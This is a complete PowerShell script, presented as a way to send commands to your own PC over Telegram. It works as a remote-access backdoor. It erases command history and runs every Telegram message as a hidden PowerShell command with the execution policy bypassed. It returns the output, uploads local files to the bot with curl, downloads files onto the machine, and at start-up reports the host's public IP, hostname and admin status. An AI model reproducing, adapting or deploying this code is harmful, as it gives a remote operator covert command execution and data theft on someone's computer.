
# Send PowerShell commands over the Internet to your PC via Telegram

Clear-Host  # Clear the shell

Set-PSReadlineOption    -HistorySaveStyle   SaveNothing             # Do not save commands run in this powershell session
Set-Location            -Path               $env:USERPROFILE        # Set the user profile location as default location
Add-Type                -AssemblyName       System.Windows.Forms    # Adds a Microsoft .NET class to a PowerShell session
Add-type                -AssemblyName       System.Drawing          # Adds a Microsoft .NET class to a PowerShell session

$tTOKEN                     = "@TOKEN"  # your API Token    (without the "@")
$tID                        = "@ID"     # your Telegram ID  (without the "@")
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $tTOKEN
$api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'                 -f $tTOKEN
$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $tTOKEN
$api_download_file          = 'https://api.telegram.org/file/bot{0}/'                       -f $tTOKEN
$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $tTOKEN, $tID
$cache_file                 = '{0}\ps_cache'                                                -f $env:LOCALAPPDATA
$wait                       =  1000
$Global:ProgressPreference  = 'SilentlyContinue'


function splitOutput ($output)
# The "splitOutput" function takes as a parameter a long text message that goes beyond 4096 characters.
# Divide the characters and create blocks of 4096 letters.
# The return of the function is an array.
{
    if ($output.Length -gt 4096) {
        Write-Host "Separation for every 4096 characters of the input output..."
    }

    $output_splitted        = $output -split ""             # Split every character from the incoming output
    $temp_part_of_output    = ""                            # Set a temporary block for save chars into it
    $array_of_output_parts  = @()                           # Set an array that it will used for saving multipart strings
    $counter                = 0                             # Set a counter to 0

    Write-Host "Working on it..."

    foreach ($char in $output_splitted) {
        if ($counter -eq 4096) {
            Write-Host "Creating a block..."
            $array_of_output_parts += $temp_part_of_output
            Write-Host "Block created..."
            $temp_part_of_output = ""
            $counter = 0
        }

        $temp_part_of_output += $char
        $counter += 1
    }
    
    Write-Host "Create the last block..."
    $array_of_output_parts += $temp_part_of_output
    
    Write-Host "The output is ready to be sent"
    return $array_of_output_parts
}


function checkAdminRights()
# The "checkAdminRights" function will check if the user running the Bot is a system administrator or not.
{
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) {
        return ($env:USERNAME + " is an Administrator")
    } else {
        return ($env:USERNAME + " is not an Administrator")
    }
}


function downloadDocument ($file_id, $file_name)
# The "downloadDocument" function takes as parameters the file_id and the file_name of the document uploaded to Telegram by the controller of the Bot. 
# Send a Get request to the Telegram API to download the file.
{
    Write-Host "Getting the informations about this document..."
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id)
    $file_path      = $get_file_path.result.file_path

    Write-Host "The file information was found, downloading it..."
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name
    
    Write-Host "Checking the file..."
    if (Test-Path -Path $file_name) {
        Write-Host "Downloaded"
        sendMessage "Downloaded"
    } else {
        Write-Host "File was not downloaded"
        sendMessage "File was not downloaded"
    }
}


function sendDocument ($file)
# The "sendDocument" function takes the path of a file as a parameter. 
# If the incoming file is verified, use curl.exe to unsecure (for now) the file to Telegram.
{
    sendMessage "Sending the document..."
    if (Test-Path -Path $file) {
        try {
            curl.exe -F document=@"$file" $api_upload_file --insecure | Out-Null    # Temporary solution (CURL.exe)
        }
        catch {
            sendMessage $Error[0]
        }
    } else {
        sendMessage "This file does not exists"
    }
}


function sendMessage ($output, $message_id)
# The "sendMessage" function takes as parameters the output of the command executed and the ID of the incoming message to reply to it. 
# To send the output as a Telegram message, the function creates a psobject object and constructs it by adding new members and member types. 
# The message will then be sent to a JSON object. 
# Finally try to send the message by making an HTTPS call to the Telegram API.
{
    Write-Host "Preparing for sending the output..."
    
    $MessageToSend = New-Object psobject
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $tID
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'protect_content'            -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'disable_web_page_preview'   -Value $false
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'parse_mode'                 -Value "html"
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'reply_to_message_id'        -Value $message_id
    $MessageToSend | Add-Member -MemberType NoteProperty -Name 'text'                       -Value ("<pre>" + $output + "</pre>")
    $MessageToSend = $MessageToSend | ConvertTo-Json # Convert the message created to a JSON format

    try {
        Write-Host "Send via API the message containing the output..."
        Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json" | Out-Null   # Send an HTTPS POST request
        Write-Host "The message has been successfully sent"
    } catch {
        Write-Host -ForegroundColor RED -BackgroundColor Black $Error[0]
        Start-Sleep -Seconds 3
    }
}


function commandListener 
# The "commandListener" function establishes a connection to the Telegram API waiting for a new message from the controller of the Bot. 
# Once the controller of the Bot sends a message, it is interpreted as a command to be executed on the Bot's powershell. 
# Once the command is executed, the result of the command will then be sent as a reply to the message to the controller of the Bot.
# Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
{
    if (-Not(Test-Path -Path $cache_file)) {
        Write-Host "Create a cache file..."
        Add-Content -Path $cache_file -Value "0" -Force
    }

    try 
    {
        Write-Host "Listening for commands..."
        while (Invoke-RestMethod -Method Get "api.telegram.org") {
            Write-Host "Checking the last text message from the telegram chat..."
            $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
            $message    = $message.result.Message[-1]                                   # Get the last JSON record
            $message_id = $message.message_id                                           # Get the message_id of the update
            $user_id    = $message.chat.id                                              # Get the ID about the sender message
            $text       = $message.text                                                 # Get the text message (it will be the command that you want to execute)
            $document   = $message.document                                             # If there is a document value inside the JSON record save it to this variable
            
            $recovered_data = 'Data recovered from the GET request: {0}, {1}, {2}, {3}, {4}' -f $message, $message_id, $user_id, $text, $document
            Write-Host $recovered_data
            
            Write-Host "Check for a new incoming command..."
            if ((Get-Content -Path $cache_file)[-1] -notmatch $message_id)
            {
                Write-Host "A new command has been discovered! [$text]"

                Write-Host "Saving the message_id [$message_id] to the cache file..."
                Add-Content -Path $cache_file -Value $message_id -Force
                
                Write-Host "Checking for the validation of the user ID..."
                if ($user_id -match $tID)
                {
                    Write-Host "User ID has been verified [$user_id]"
                    if ($text -match "exit")
                    {
                        Write-Host "Connection closure..."
                        exit
                    }
                    
                    Write-Host "Checking the length of the command..."
                    if ($text.Length -gt 0)
                    {
                        try {
                            Write-Host "Executing it..."
                            $output = Powershell.exe -ep Bypass -WindowStyle Hidden -Command $text
                            Write-Host "Converting the output captured to a String..."
                            $output = $output | Out-String
                        } catch {
                            $err = $Error[0]
                            Write-Host "ERROR DURING THE EXECUTION OF THE INSTRUCTIONS"
                            Write-Host "Converting the error message to a String..."
                            $output = $err | Out-String
                        }
                        
                        Write-Host "Sends the captured output to the split function..."
                        $output = splitOutput $output
                        
                        Write-Host "Send to Telegram all blocks returned from the split function..."
                        foreach ($block in $output)
                        {
                            Write-Host "Converting to string the splitted block..."
                            $block = $block | Out-String

                            Write-Host "Checking if the block size is major than 2..."
                            if ($block.Length -gt 2)
                            {
                                Write-Host "Send the data to the message sending function..."
                                sendMessage $block $message_id
                            } 
                            else {
                                Write-Host "Send the data to the message sending function..."
                                sendMessage "No Output Data" $message_id
                            }
                        }

                        Write-Host "Set the timer to 1000ms"
                        $wait = 1000
                    }
                    
                    if ($document) {
                        Write-Host "Getting the informations about the file..."
                        $file_id   = $document.file_id
                        $file_name = $document.$file_name
                        
                        Write-Host "File informations: [$file_id] [$file_name]"

                        Write-Host "Send these informations to the download file function..."
                        downloadDocument $file_id $file_name
                    }
                } 
                else {
                    $unauth_user_found = ("Unauthorized user found! " + $user_id)
                    Write-Host $unauth_user_found
                    sendMessage $unauth_user_found
                }
            }

            if ($wait -eq 15000) {
                Write-Host "The timer has reached the maximum of its default value, I reset it to 1000ms..."
                $wait = 1000
            } else {
                $wait = $wait + 100
            }
            
            Write-Host "Wait [$wait]ms..."
            Start-Sleep -Milliseconds $wait
        }
    } 
    catch {
        while ($true) {
            try {
                Test-NetConnection -ComputerName "api.telegram.org" -Port 80
                break
            }
            catch {
                Write-Host $Error[0]
                Start-Sleep -Milliseconds 5
            }
        }
        Write-Host "Restart the listener..."
        commandListener
    }
}


try {
    if ((tnc).PingSucceeded) {
        Write-Host "Alert the Bot owner that the listener has been started!"
        Write-Host "Recovering initial informations..."
        $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
        $_path  = (Get-Location).Path                                                   # Get the current location of the Bot
        $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
        $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
        $_body  = '{0} ({1}) - IP: {2} - [{3}]' -f $_host, $_user, $_ip, $_path         # Build everything...
        sendMessage $_body                                                              # Send a message with the body 
        Write-Host "Alert sent"
    }
}
catch {
    Write-Host $Error[0]
}


commandListener # Start the Bot